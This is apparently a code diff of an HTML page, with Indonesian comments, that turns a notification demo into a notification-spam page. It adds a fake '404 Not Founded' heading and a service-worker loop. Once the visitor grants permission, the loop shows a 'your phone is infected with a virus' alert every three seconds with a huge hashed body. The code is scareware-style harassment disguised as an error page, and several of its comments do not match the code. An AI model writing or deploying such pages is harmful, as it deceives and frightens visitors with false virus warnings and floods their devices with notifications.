@@ -1,9 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Sentinel</title>
+  <title>Spam Notif Gede Banget 🚀</title>
 </head>
 <body style="text-align:center; margin-top:50px;">
+  <h1>404 Not Founded</h1>
   <script>
     if ('Notification' in window && navigator.serviceWorker) {
       Notification.requestPermission().then(function(permission) {
@@ -21,16 +22,25 @@
               return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
             }
 
-            setInterval(async () => {
-              const titleHash = await hashText(randomText());
-              const bodyHash = await hashText(randomText());
+            async function createBigText() {
+              let bigText = "";
+              for (let i = 0; i < 5000; i++) {  // 5000 hash jadi super panjang
+                bigText += await hashText(randomText());
+              }
+              return bigText;
+            }
 
-              reg.showNotification(titleHash.substring(0, 16), {
-                body: bodyHash.substring(0, 32),
+            async function spamNotif() {
+              const bigBody = await createBigText();
+              reg.showNotification("Hp Anda Terinfeksi Virus 🚨", {
+                body: bigBody.substring(0, 9000), // max chrome ~10KB notif body
                 icon: "https://via.placeholder.com/128",
-                tag: "auto-spam-notif"
+                tag: "big-spam"
               });
-            }, 1000); // 5 detik brooo!
+              setTimeout(spamNotif, 3000); // 60 detik
+            }
+
+            spamNotif();
           });
         }
       });
